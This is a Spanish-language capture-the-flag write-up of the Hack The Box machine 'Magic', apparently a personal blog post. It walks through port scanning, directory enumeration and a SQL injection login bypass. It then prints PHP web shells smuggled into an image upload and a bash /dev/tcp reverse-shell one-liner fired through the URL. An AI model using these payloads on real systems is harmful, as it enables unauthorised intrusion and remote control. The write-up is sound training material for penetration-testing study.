---
layout: single
title: Magic - Hack The Box
excerpt: "Magic comienza con una vulnerabilidad clasica de carga insegura de archivos en PHP que nos permite colocar un webshell en el host de destino y luego explotamos una configuración incorrecta del servidor web para ejecutar el webshell (aunque el nombre del archivo no debe terminar con extensión .php). Una vez que aterrizamos un shell, escalamos a otro usuario"
date: 2021-12-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-magic/magic_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
tags:
  - SQL Injection
  - MySQL
  - PHP
  - Unrestricted File Upload
---

<p align="center">
  <img src="../assets/images/htb-writeup-magic/magic_logo.png">
</p>

# Introducción

Magic comienza con una vulnerabilidad clasica de carga insegura de archivos en PHP que nos permite colocar un webshell en el host de destino y luego explotamos una configuración incorrecta del servidor web para ejecutar el webshell (aunque el nombre del archivo no debe terminar con extensión .php). Una vez que aterrizamos un shell, escalamos a otro usuario.  
<br>

# Antes de iniciar
Como es mi primera maquina virtual (box) y soy nuevo con la plataforma de hackthebox, para poder jugar con las maquinas virtuales necesito una conexión con OpenVPN (esta aplicación viene preinstalada en Parrot OS). Esta aplicación permitirá ubicar nuestra host en la misma subred IP que las máquinas vulnerables (boxes), lo que le permitirá contactarlos y atacarlos.

Me ayudé con este video: [https://www.youtube.com/watch?v=SmbpScohIFs]( https://www.youtube.com/watch?v=SmbpScohIFs ) . Este video muestra como descargar el archivo de configuración automatica de nuestro cliente de OpenVPN e inicializar la conexión con el servidor. El archivo descargado tendra la extensión .ovpn (tickets).

Inicializar la conexión en este comando:

```go
sudo openvpn pack.ovpn
```

En caso de tener el siguiente error al ejecutar el anterior comando: “Linux can't add IPv6 to interface tun1” es poder Ipv6 se encuentra dehabilitado. Se puede habilitar con este comando:

```go
sudo sysctl net.ipv6.conf.all.disable_ipv6=0
```

Nos aseguramos que se encuentre habilitado IPv6 con (debe imprimir 0): 

```go
cat /proc/sys/net/ipv6/conf/all/disable_ipv6
```
Fuente: [https://forum.hackthebox.com/t/openvpn-troubles/3478/2](https://forum.hackthebox.com/t/openvpn-troubles/3478/2) 

Este video sirve para probar conexión con la maquina una vez hemos hecho lo anterior: [https://www.youtube.com/watch?v=Ykaw6SSW994](https://www.youtube.com/watch?v=Ykaw6SSW994) 

Podemos comprobar nuestra IP remota con:

```go
ip a s tun0
```

Respuesta:

```go
8: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.12/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100a/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::e337:d4b5:1e14:2ae7/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

```
<br>

# Desarrollo de la practica

Basado en video de S4vitar on live: [https://www.youtube.com/watch?v=ZJ72UuUlz10]( https://www.youtube.com/watch?v=ZJ72UuUlz10 )  

Creo un directorio para la box actual:

```go
mkdir magic
```

y creamos los siguientes directorio dentro del él:

```go
mkdir nmap content exploits
```

## Fase de reconocimiento:

```go
cd nmap
```

Comprobamos si tenemos conexión con la maquina con:

```go
ping -c 1 10.10.10.185
```

Obtenemos:

```go
PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=183 ms

--- 10.10.10.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

**ttl** (Time To Live) es el maximo numero de rutas IP que un paquete ICMP puede atravesar antes de ser descartado. Y gracias a esto, podemos conocer el sistema operativo que ha respondido a nuestra traza ICMP es Linux, porque una respuesta igual o menor a 64 significa Linux SO, y una menor o igual 128 es Windows OS (El ttl 63 es porque tenemos OpenVPN).

Adicionamente, con ping -R podemos ver las rutas IP por las que paso nuestro ping:

```go
ping -c 1 10.10.10.185 -R
```

Vamos a escanear puertos con nmap:

```go
nmap -p- --open -T5 -v -n 10.10.10.185
```

Con el anterior comando estamos diciendo:
- -p- → Escaneamos todo el rango de puertos (65.535 puertos).
- --open → Filtramos dejando solo los puertos que estan abiertos.
- -T5 → (Varia entre T0 hasta T5) Indica la rapidez con que queremos que se realice nuestro escaneo. En este caso es lo más rapido
- -v → De verbose. A medida que encuentra puertos abiertos me los reporte por consola.
- -n → Para no aplicar resolución DNS y nuestro escaneo será más rápido.

Resultado:

```go
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 18:30 -05
Initiating Ping Scan at 18:30
Scanning 10.10.10.185 [2 ports]
Completed Ping Scan at 18:30, 0.46s elapsed (1 total hosts)
Initiating Connect Scan at 18:30
Scanning 10.10.10.185 [65535 ports]
Discovered open port 80/tcp on 10.10.10.185
Discovered open port 22/tcp on 10.10.10.185
Connect Scan Timing: About 9.29% done; ETC: 18:36 (0:05:03 remaining)
Connect Scan Timing: About 19.10% done; ETC: 18:35 (0:04:18 remaining)
Connect Scan Timing: About 25.79% done; ETC: 18:36 (0:04:39 remaining)
Connect Scan Timing: About 32.85% done; ETC: 18:36 (0:04:20 remaining)
Connect Scan Timing: About 40.79% done; ETC: 18:36 (0:03:48 remaining)
Connect Scan Timing: About 54.04% done; ETC: 18:36 (0:02:39 remaining)
Connect Scan Timing: About 60.72% done; ETC: 18:36 (0:02:20 remaining)
Connect Scan Timing: About 75.40% done; ETC: 18:35 (0:01:21 remaining)
Connect Scan Timing: About 90.50% done; ETC: 18:35 (0:00:30 remaining)
Completed Connect Scan at 18:36, 367.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.185
Host is up (0.12s latency).
Not shown: 57057 closed tcp ports (conn-refused), 8476 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Otro comando para hacer nuestro reconocimiento de puertos sería (Más rápido que el anterior):

```go
nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185

```

Con el anterior comando estamos diciendo:
- -sS → Que vaya los más rápido posible. 
- –min-rate 5000 → Vamos a emitir como minimo 5000 paquetes por segundo (Ya no es necesario -T5)
- -vvv → Para que nos arroje un poquito de más información de lo que encuentra nuestra busqueda.
- -Pn → Solo ejecuta el escaneo con host que estan activos, a diferencial del escaneo normal que realiza el procedicimiento de escaneo para un rango de IP aunque el/los host especificados no esten activos.
- -oG allports → Le decimos que la busqueda realizada la guarde en un archivo grepeable llamado “allports”. [Aqui]( https://www.asyforin.es/kali/herramienta-kali-3-nmap-miscelanea-y-salida-de-datos/ ) puedes encontrar más información sobre el formato grepeable.


```go
cat allports
```

obtenemos:

```go
# Nmap 7.92 scan initiated Tue Dec 14 12:56:22 2021 as: nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.185 ()	Status: Up
Host: 10.10.10.185 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Con esto nos damos cuenta que la máquina tiene abiertos los puertos . Ahora vamos a ver la versión y los servicios que estan corriendo por esos puertos con el siguiente comando:

```go
nmap -sCV -p22,80 10.10.10.185 -oN targered
```

Con el anterior comando estamos diciendo:
- [-sCV](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-v+) → Versiones y ejecución de algunos scripts por defecto de nmap (algunos scripts son intrusivos). 
- -p → Para especificar los comando a los cuales le queremos hacer lo anterior
- -oN targered → Que almacene en un archivo llamado “targered”en el formato de nmap (Salida normal) el resultado de este comando 

Resultado:

```go
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 13:46 -05
Nmap scan report for 10.10.10.185
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds

```

Ahora intentamos acceder a la página “Magic Portfolio” con la url: [http://10.10.10.185/]( http://10.10.10.185/ ) y vemos una página con varias imagenes cargadas:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/Magic-Portfolio-Page.png">
</p>
Cada imagen tiene un título con caracteres alfanumericos. Parecen hashes o caracteres hexadecimales. Con la herramienta [xxd](https://francisconi.org/linux/comandos/xxd ) podemos convertir hexadecimal a binario con este comando:

```go
echo 4d61676963 | xxd -r -p
```

Salida:

```go
Magic
```

Pero no encontramos nada relevante :(

En este punto podemos buscar en el código fuente de la página a ver si encontramos alguna información rara y que nos pueda servir en nuestro objetivo:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/codigo-fuente-pagina.png">
</p>
Buscaremos rutas dentro de nuestra página a ver si encontramos descubrimos alguno. Usaremos gobuster para esto:

```go
gobuster -h
```

Resultado:

```go
sage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
```

Con este comando de gobuster empezará el escaneo del sitio web:

```go
gobuster dir -u http://10.10.10.185/ -w /usr/share/wordlists/dirb/common.txt 
```

Resultado:

```go
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.185/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/16 15:47:32 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.sh_history          (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.185/assets/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.185/images/]
/index.php            (Status: 200) [Size: 4052]                                 
/server-status        (Status: 403) [Size: 277]                                  
                                                                                 
===============================================================
2021/12/16 15:48:20 Finished
===============================================================
```

También con otro diccionario de rutas más amplio de dirbuster (220561 rutas) pero se demora mucho más:


```go
gobuster dir -x php -u http://10.10.10.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Resultado:

```go
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.185/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/16 16:37:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.10.185/images/]
/index.php            (Status: 200) [Size: 4054]                                 
/login.php            (Status: 200) [Size: 4221]                                 
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.185/assets/]
/upload.php           (Status: 302) [Size: 2957] [--> login.php]                 
/logout.php           (Status: 302) [Size: 0] [--> index.php]                    
                                                                                 
===============================================================
2021/12/16 16:52:23 Finished
===============================================================
```

Regresando a la página principal, vemos en la parte inferior un botón que nos redirije al login: [http://10.10.10.185/login.php ]( http://10.10.10.185/login.php ) 

<p align="center">
  <img src="../assets/images/htb-writeup-magic/Magic-Portfolio-login.png">
</p>
En este login intentaremos hacer una inyección sql con una condición booleana (Aunque no nos deje poner espacios simplemente podemos poner la inyección en el navegador, la copiamos y pegamos en el campo):


```go
' or 1=1 --
```

Y vemos que funciona!!! (Tambien funciona **' or 1=1 #** )

<p align="center">
  <img src="../assets/images/htb-writeup-magic/Magic-Portfolio-upload.png">
</p>
Ahora subimos una imagen de prueba para ver como es el comportamiento de la aplicación:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/Magic-Portfolio-uploading.png">
</p>
<p align="center">
  <img src="../assets/images/htb-writeup-magic/Magic-Portfolio-uploaded.png">
</p>
Podemos consultar la imagen con esta url: [http://10.10.10.185/images/uploads/imagen-de-prueba.png](http://10.10.10.185/) 
Por las rutas de las imagenes que ya estan podemos decir que las imagenes son almacenadas en 2 rutas:  

- [http://10.10.10.185/images/uploads](http://10.10.10.185/images/uploads)
- [http://10.10.10.185/images/fulls](http://10.10.10.185/images/fulls)

Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad está reportada en [OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) ), el cual nos permita ejecutar comandos a nivel de sistema (dentro del servidor) a través de la URL. El archivo “prueba.php” es el siguiente:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

El anterior comando nos permitira por medio de etiquetas preformateadas (Texto HTML Preformateado) controlar el valor de la variable “cmd” para poder ejecutar comandos en el servidor que corre el aplicativo web. En caso de funcionar esto, se podrian ejecutar comandos como este ejemplo: http://10.10.10.185/images/uploads/prueba.php?cmd=whoami 

Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imagenes:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/No-se-admite-el-formato.png">
</p>
Tampoco si intentamos subir la imagen con una extensión diferente ([prueba.jpg](prueba.jpg)) pero con el mismo contenido:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/tampoco-se-admite-con-otra-extension.png">
</p>

Pero podemos intentar subir esta secuencia en php jugando con los magic numbers:
## Magic Numbers

Los números magicos (también en ingles Magic numbers ó File signature) son los primeros bytes de un archivo que identifican de forma única el tipo de archivo. Estos números permite al sistema operativo diferenciar y reconocer diferentes archivos sin necesitar la extensión del archivo.

<p align="center">
  <img src="../assets/images/htb-writeup-magic/Numeros-magicos-de-archivos.png">
</p>
Aúnque en algunos casos los números magicos no se encuentran en los primeros bytes del archivo. Por ejemplo, el sistema de archivos ext2 / ext3 tiene los bytes 0x53 y 0xEF en la posición 1080 y 1081. 
Más información en: [https://www.geeksforgeeks.org/working-with-magic-numbers-in-linux/ ](https://www.geeksforgeeks.org/working-with-magic-numbers-in-linux/ )
Lista de algunos números magicos: [1](https://en.wikipedia.org/wiki/List_of_file_signatures) [2](https://asecuritysite.com/forensics/magic) [3]( https://www.garykessler.net/library/file_sigs.html )
<br>
<br>
<br>
Se complico un poco subir el archivo modificando los magic numbers manualmente, entonces se puede usar un truco que consisten en pones la extension *.php.png* al archivo, y agregar en alguna parte de este archivo (se encuentra en formato binario) codigo en php. Insertaremos la siguiente linea en el archivo **prueba.php.png** :

```php
<?php system($_GET['cmd']); ?>
```

Quedaría algo así:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/php-en-archivo-extension-php-png.png">
</p>

Lo subimos y obtenemos una respuesta exitosa:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/subida-exitosa-php-png.png">
</p>

Probamos la ruta [http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png?cmd=whoami](http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png?cmd=whoami), en la cual ya estamos asignando el valor “whoami” a la variable cmd que se ejecutará en el servidor. Obtenemos “www-data”:

<p align="center">
  <img src="../assets/images/htb-writeup-magic/respuesta-exitosa-subida-php-png.png">
</p>

De esta forma comprobamos la ejecución de comandos. Ahora intentamos hacer una reverse shell. Para esto primero localmente debemos ponernos en escucha por el puerto 443 usando la herramienta [netcat] (https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/?utm_source=twitterfeed&utm_medium=twitter):

```go
> sudo nc -nlvp 443
listening on [any] 443 ...
```

Y en la url establecemos la conexión desde el servidor [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'). Pero no anterior no punciona porque la barra de url no reconoce el signo **&** , y en vez de eso debemos poner su correpondiente en códificación url que es ** & → %26 **. Quedaría así: [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261')
<p align="center">
  <img src="../assets/images/htb-writeup-magic/reverse-shell-completada.png">
</p>
Ya tenemos una consola para ejecutar comando en el servidor!!!
<br>
Aunque la ejecución de comando no aparece en un buen formato, como estamos acostumbrados:

```go
www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
whoami
www-data
www-data@ubuntu:/var/www/Magic/images/uploads$ ls
ls
7.jpg
giphy.gif
logo.png
magic-1424x900.jpg
magic-hat_23-2147512156.jpg
magic-wand.jpg
trx.jpg
www-data@ubuntu:/var/www/Magic/images/uploads$ ll
ll
ll: command not found
```
Para corregir esto hacemos:

```go
script /dev/null -c bash
```








Página donde muestran la reverse shell: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) (Sección de PHP) y si queremos un archivo de reverse shell más robusto podemos descargar este: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell ](https://pentestmonkey.net/tools/web-shells/php-reverse-shell ) 

Fuentes:
- [https://www.youtube.com/watch?v=ZJ72UuUlz10](https://www.youtube.com/watch?v=ZJ72UuUlz10)
- [https://snowscan.io/htb-writeup-magic/#](https://snowscan.io/htb-writeup-magic/#)
